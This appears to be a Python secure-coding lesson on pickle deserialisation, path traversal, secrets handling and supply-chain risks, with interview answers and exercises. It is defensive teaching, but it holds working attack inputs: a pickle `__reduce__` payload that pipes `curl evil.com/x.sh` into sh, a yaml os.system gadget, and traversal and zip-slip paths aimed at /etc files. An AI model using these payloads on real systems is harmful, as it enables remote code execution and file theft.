# Part 1 — ⭐⭐ Deserialisation

```python
import pickle, os

class Exploit:
    def __reduce__(self):                              # ⭐⭐ Day 031's data model
        return (os.system, ("curl evil.com/x.sh | sh",))

payload = pickle.dumps(Exploit())                      # ⭐ send this to a server
pickle.loads(payload)                                  # ⭐⭐ …and it RUNS
```

```
⭐⭐ WHY THIS IS NOT A BUG THAT CAN BE FIXED: PICKLE'S JOB IS TO RECONSTRUCT
⭐   ARBITRARY PYTHON OBJECTS, AND RECONSTRUCTION MEANS CALLING A CALLABLE THE
⭐   **PAYLOAD** NAMES. ⭐ `__reduce__` exists precisely to say "to rebuild me,
⭐   call this with these arguments" — ⭐⭐ so an attacker who controls the
⭐   payload controls what gets called.
⭐   ⇒ ⭐⭐ THE DOCUMENTATION SAYS SO PLAINLY: "the pickle module is not secure
⭐        against erroneous or maliciously constructed data." ⭐ It is a
⭐        PERSISTENCE format for data YOU produced, not a WIRE format.
⭐   ⇒ ⭐ and it is Day 116's principle again — ⭐⭐ NEVER LET UNTRUSTED INPUT
⭐        SELECT THE CODE PATH THAT PROCESSES IT. `alg=none` chose the verifier;
⭐        `__reduce__` chooses the constructor.
⭐   ⇒ ⚠️ ⭐ SIGNING the pickle (HMAC) makes it safe ONLY while the key is
⭐        secret. ⭐⭐ Prefer a format that cannot execute anything at all.
```

| ⚠️ Format | ⭐ Risk |
|---|---|
| ⭐⭐ `pickle`, `shelve`, `dill`, `marshal` | ⭐⭐ **arbitrary code execution.** Never on untrusted input |
| ⭐ `yaml.load` (unsafe loader) | ⭐⭐ same — `!!python/object/apply:os.system` · ⭐ use `yaml.safe_load` |
| `json` | ⭐ safe — ⚠️ ⭐ but see the `object_hook` you wrote yourself |
| ⭐ `xml` (stdlib) | ⚠️ ⭐⭐ **billion laughs**, XXE ⇒ use `defusedxml` |
| Pydantic / dataclasses | ⭐⭐ safe — ⭐ they construct **known** types |

```
⭐⭐ WHERE PICKLE HIDES, AND THESE ARE THE ONES THAT CATCH PEOPLE:
⭐   · ⭐⭐ CELERY / RQ with a pickle serializer ⇒ ⭐⭐ anyone who can write to the
⭐        QUEUE has RCE on every worker. ⭐ Set `task_serializer = "json"`.
⭐   · ⭐ CACHED OBJECTS IN REDIS ⇒ if Redis is exposed (Day 127's SSRF!), the
⭐        cache is an execution channel.
⭐   · ⭐⭐ ML MODEL FILES — `.pkl`, `joblib`, and PyTorch `.pt` — ⭐⭐ downloading
⭐        a model from the internet and loading it IS running its code. ⭐ Use
⭐        `safetensors`, or load only what you produced.
⭐   · ⭐ `multiprocessing` uses pickle internally (Day 068) — ⭐ fine, because
⭐        the payloads are yours.
```

# Part 2 — ⭐⭐ Path traversal

```python
# ⚠️⚠️ VULNERABLE
@app.route("/files/{name:path}")
def download(request, name: str):
    return Path("/srv/uploads", name).read_bytes()
# ⇒ ⭐ name = "../../etc/passwd"
# ⇒ ⭐⭐ name = "..%2f..%2fetc%2fpasswd"   ⇒ decoded AFTER a naive check
# ⇒ ⭐ name = "/etc/passwd"               ⇒ ⭐⭐ Path("/srv", "/etc/passwd") == "/etc/passwd"
```

```
⭐⭐ THAT LAST ONE SURPRISES PEOPLE AND IS WORTH INTERNALISING: `Path` JOINING AN
⭐   ABSOLUTE PATH **DISCARDS THE BASE ENTIRELY**. So a check for `".."` passes
⭐   and the file is still outside the directory.
⭐   ⇒ ⭐⭐ THE CORRECT CHECK — resolve first, then verify containment (Day 078):
```

```python
base = Path("/srv/uploads").resolve()
target = (base / name).resolve()                      # ⭐⭐ resolve BEFORE checking
if not target.is_relative_to(base):                    # ⭐ 3.9+
    raise HTTPError(404, "not found")                  # ⭐ 404, not 403 (Day 118)
```

```
⭐⭐ WHY RESOLVE FIRST, AND WHY IT IS NOT ENOUGH ON ITS OWN:
⭐   `resolve()` normalises `..`, collapses `.`, AND FOLLOWS SYMLINKS — ⭐⭐ so it
⭐   also catches a symlink inside the upload directory pointing at `/etc`,
⭐   which a string check never would.
⭐   ⇒ ⚠️ ⭐ BUT THERE IS A RACE (TOCTOU): the path can be replaced between the
⭐        check and the open. ⭐⭐ For genuinely hostile input, open the file and
⭐        verify the resulting descriptor, or use `O_NOFOLLOW`.
⭐   ⇒ ⭐⭐ AND THE STRONGEST ANSWER IS ARCHITECTURAL: DO NOT DERIVE FILESYSTEM
⭐        PATHS FROM USER INPUT AT ALL. Store an id, look up the real path in the
⭐        database, and serve object storage through a presigned URL. ⭐ Then the
⭐        vulnerability class does not exist.
⭐   ⇒ ⭐ the same reasoning applies to `zipfile.extractall` — ⭐⭐ a zip entry
⭐        named `../../etc/cron.d/x` writes outside the target directory. That is
⭐        "zip slip", and `extractall` does not protect you.
```

# Part 3 — ⭐⭐ Secrets

```
⭐⭐ WHERE SECRETS GO, WORST TO BEST — AND NOTE THAT THE FIRST THREE ARE ALL
⭐   COMMON:
⭐  1. ⚠️⚠️ ⭐⭐ IN THE SOURCE ⇒ Day 085. In history forever; rotate, do not clean.
⭐  2. ⚠️ ⭐ IN A COMMITTED CONFIG FILE ⇒ the same thing with extra steps.
⭐  3. ⭐ AN ENVIRONMENT VARIABLE ⇒ ⭐ better, and ⚠️ ⭐⭐ visible in
⭐       `/proc/PID/environ` (Day 082), in `ps eww`, in crash reports, in
⭐       `docker inspect`, and in any library that dumps the environment.
⭐  4. ⭐ A MOUNTED FILE (Kubernetes secret, Docker secret) ⇒ ⭐ not in the
⭐       process environment; readable only by the process.
⭐  5. ⭐⭐ A SECRETS MANAGER (Vault, AWS Secrets Manager) with SHORT-LIVED
⭐       CREDENTIALS ⇒ ⭐⭐ the real answer, because it makes ROTATION ROUTINE.
⭐  6. ⭐⭐ NO SECRET AT ALL — an IAM role, workload identity, mTLS ⇒ ⭐ nothing
⭐       to leak, nothing to rotate. ⭐⭐ The best secret is one that does not exist.
```

```
⭐⭐ THE PROPERTY THAT MATTERS MORE THAN STORAGE: **CAN YOU ROTATE IT IN TEN
⭐   MINUTES, WITHOUT A DEPLOY?**
⭐   ⇒ ⭐ if the answer is no, then on the day it leaks you have a choice between
⭐        an outage and continued exposure — ⭐⭐ and that decision, made under
⭐        pressure, is how leaked credentials stay live for weeks.
⭐   ⇒ ⭐ so: support TWO valid keys at once (old and new), so rotation is
⭐        add-new, migrate, remove-old — ⭐⭐ Day 125's expand/migrate/contract,
⭐        applied to credentials.
⭐   ⇒ ⭐ and practise it. A rotation procedure that has never been run is a
⭐        document, not a capability (Day 101's runbook).
```

⚠️ ⭐⭐ **Secrets leak through more channels than storage:** a log line (Day 099A), an error body
(Day 120), a crash reporter, a URL query string that lands in access logs and `Referer` headers, a CI
job that echoes its environment on failure, and a `.env` file in a Docker image layer. ⭐ **Scan for
them** — `gitleaks` in pre-commit (Day 099) and a scanner over built images.

# Part 4 — ⭐ Your dependencies

```
⭐⭐ YOUR APPLICATION IS A FEW THOUSAND LINES YOU WROTE AND A FEW MILLION YOU DID
⭐   NOT — AND YOU SHIP ALL OF IT.
⭐   □ ⭐⭐ A LOCKFILE WITH HASHES (Day 075) ⇒ ⭐ the same bytes every build, and
⭐       a tampered artefact fails the hash check.
⭐   □ ⭐ `pip-audit` / `uv pip audit` in CI ⇒ known CVEs, at build time.
⭐   □ ⭐⭐ AN UPGRADE CADENCE. ⭐ A dependency you never update becomes
⭐       unupgradeable: three major versions behind, and the security patch is
⭐       now a migration project. ⭐⭐ Small and frequent beats safe and never.
⭐   □ ⭐ minimise the tree — every package is a supply-chain entry point.
⭐   □ ⭐ an SBOM if you sell to anyone who asks for one.
```

```
⚠️⚠️ ⭐⭐ THE PYTHON-SPECIFIC ATTACK: `pip install` RUNS `setup.py` — ⭐⭐ ARBITRARY
⭐    CODE, AS YOU, AT INSTALL TIME. Which makes the package name a target:
⭐    · ⭐ TYPOSQUATTING ⇒ `reqeusts`, `python-dateutil` vs `dateutil`
⭐    · ⭐⭐ DEPENDENCY CONFUSION ⇒ you have an INTERNAL package `acme-utils`;
⭐         an attacker publishes `acme-utils` on PyPI with a HIGHER VERSION, and
⭐         your resolver prefers it. ⭐ Fix: pin the index, and reserve your
⭐         internal names publicly.
⭐    · ⭐⭐ SLOPSQUATTING ⇒ ⭐⭐ AN LLM SUGGESTS A PACKAGE THAT DOES NOT EXIST,
⭐         SOMEONE REGISTERS THAT NAME, AND EVERY DEVELOPER WHO FOLLOWED THE
⭐         SUGGESTION INSTALLS IT. ⭐ A genuinely new attack surface, and the
⭐         defence is simply: ⭐⭐ CHECK THAT A PACKAGE EXISTS AND IS THE ONE YOU
⭐         MEANT BEFORE INSTALLING IT — repository, download counts, release
⭐         history.
⭐    ⇒ ⭐ prefer wheels over sdists (no build step), and `--require-hashes`.
```

⭐ **Isolate the blast radius too:** run as non-root (Day 078), a read-only filesystem, no unnecessary
egress. ⭐⭐ **A compromised dependency that cannot write files or reach the internet is much less
useful than one that can.**

# Part 5 — ⭐ The rest, and the mindset

| ⭐ Issue | ⭐ Defence |
|---|---|
| ⭐ File upload | ⭐⭐ validate the **content**, not the extension · never serve from the upload dir · a random stored name · size and type limits |
| ⭐⭐ ZIP slip | ⭐ validate every entry path before extracting |
| ⭐ Open redirect | ⭐⭐ `?next=` must be an **allow-listed relative path**, or it is a phishing gadget |
| ⭐ Email header injection | ⭐ a newline in a name field forges headers — strip `\r\n` |
| ⭐⭐ ReDoS | ⭐ Day 076 — no nested quantifiers, never build a regex from user input |
| ⭐ CSV injection | ⭐⭐ a cell starting `=` executes in Excel — prefix with `'` |
| ⭐ Timing leaks | ⭐ `compare_digest` (Day 114) |
| ⭐⭐ Debug mode in production | ⭐⭐ an interactive console on your error page. Assert it is off at startup |

```
⭐⭐ THE MINDSET, WHICH IS WORTH MORE THAN THE LIST:
⭐  1. ⭐⭐ ASSUME EVERY INPUT IS HOSTILE — including the ones from your own
⭐       front end, your own mobile app, and another internal service. ⭐ "It
⭐       comes from our app" is not a control; anyone can send that request.
⭐  2. ⭐ LEAST PRIVILEGE EVERYWHERE — the DB user, the container user, the IAM
⭐       role, the network. ⭐⭐ Every one of them limits what a successful attack
⭐       can reach.
⭐  3. ⭐⭐ ASSUME BREACH. Design so that ONE compromise is not TOTAL: hashed
⭐       passwords, hashed refresh tokens, rotatable secrets, no lateral network
⭐       access, audit logs you can actually read.
⭐  4. ⭐⭐ MAKE THE SECURE THING THE EASY THING (Days 112, 118). A repository
⭐       method that requires an actor, a template engine that escapes by
⭐       default, a schema that rejects unknown fields — ⭐ those work at 6 p.m.
⭐       on a Friday, and a checklist does not.
```

## Common mistakes

| Mistake | Correction |
|---|---|
| ⭐⭐ **`pickle.loads` on anything external** | ⭐⭐ Remote code execution by design. Use JSON. |
| Celery with the pickle serializer | ⭐⭐ Queue write access becomes RCE on every worker. |
| ⭐ Loading a downloaded `.pkl` model | ⭐ Loading it *is* running it. Use `safetensors`. |

## Interview questions

**Q: Why is `pickle` dangerous?**
> Because unpickling constructs arbitrary Python objects, and constructing an object means calling
> something the payload names — that's what `__reduce__` is for. So an attacker who controls the bytes
> controls what gets called, and a fifteen-line class gives you shell execution. It isn't a bug that
> can be patched; it's what the format does. The documentation says so outright. It's a persistence
> format for data you produced, not a wire format. And it's the same principle as the `alg=none` JWT
> attack: never let untrusted input select the code path that processes it.

**Q: Where does pickle turn up without people noticing?**
> Celery or RQ configured with a pickle serializer, which means anyone who can write to the queue has
> code execution on every worker — that's usually a bigger blast radius than the web tier. Cached
> objects in Redis, which becomes an execution channel if Redis is reachable, and SSRF is one way it
> becomes reachable. And machine-learning model files: downloading a `.pkl` or a PyTorch checkpoint
> from the internet and loading it *is* running its code, which is why `safetensors` exists.

**Q: How do you prevent path traversal?**
> Resolve the joined path and check containment — `(base / name).resolve()` then `is_relative_to`.
> Checking for `".."` fails for two reasons: percent-encoding gets decoded after a naive check, and
> joining an *absolute* path silently discards the base, so `Path("/srv", "/etc/passwd")` is just
> `/etc/passwd`. Resolving also follows symlinks, so it catches a link inside the upload directory
> pointing at `/etc`, which no string check would. There's still a TOCTOU race for genuinely hostile
> input. The strongest answer is architectural: don't derive filesystem paths from user input at all —
> store an id, look the path up, serve via presigned URLs — and the class of bug stops existing.

**Q: Where should secrets live?**
> A secrets manager with short-lived credentials, or better, no secret at all — an IAM role or
> workload identity, where there's nothing to leak and nothing to rotate. Environment variables are a
> step up from a config file but they're visible in `/proc/PID/environ`, in `ps`, in crash reports and
> in `docker inspect`. But the property I actually care about is rotation: can I rotate this in ten
> minutes without a deploy? If not, then on the day it leaks I'm choosing between an outage and
> continued exposure, and that decision under pressure is how leaked credentials stay live for weeks.
> So the system should accept two valid keys at once — expand, migrate, contract, applied to
> credentials — and the procedure should have been practised.

**Q: What's slopsquatting?**
> An LLM suggests a package name that doesn't exist, someone notices and registers it, and every
> developer who followed that suggestion installs an attacker's code — and `pip install` runs
> `setup.py`, so that's arbitrary code execution as you, at install time. It's a genuinely new
> variant of typosquatting created by the way people now find packages. The defence is unglamorous:
> check the package exists and is the one you meant before installing — repository, download counts,
> release history. Alongside pinning the index to avoid dependency confusion, and hash-pinned
> lockfiles so builds are reproducible.

## Mini task

1. ⭐⭐ Write the `__reduce__` exploit and **run it against your own `pickle.loads`.** (Make it write a
   file rather than anything destructive.)
2. ⭐ Do the equivalent with `yaml.load`, then confirm `safe_load` refuses it.
3. ⭐ Parse a billion-laughs XML with the stdlib and watch memory. Then use `defusedxml`.
4. ⭐⭐ Check your Celery config for the serializer. **Set it to JSON if it is not.**
5. ⭐⭐ Build the vulnerable download endpoint and traverse it three ways: `..`, percent-encoded, and
   an **absolute path.**
6. ⭐⭐ Fix it with `resolve()` + `is_relative_to`. Then **plant a symlink** inside the directory and
   confirm it is still caught.
7. ⭐ Build a zip with an entry named `../../evil.txt` and run `extractall` in a scratch directory.
8. ⭐⭐ Find a secret in an environment variable and **read it from `/proc/PID/environ`.**
9. ⭐⭐ **Rotate one secret end to end** without a deploy. Time it. If you cannot, that is the finding.
10. ⭐ Run `pip-audit` and read every finding. Upgrade one.
11. ⭐⭐ Add hash-pinned installs and confirm a tampered wheel fails.
12. ⭐ Add an `?next=` redirect, **turn it into an open redirect**, then allow-list relative paths only.
13. ⭐⭐ Assert at startup that debug mode is off in production, and make it fail loudly if not.
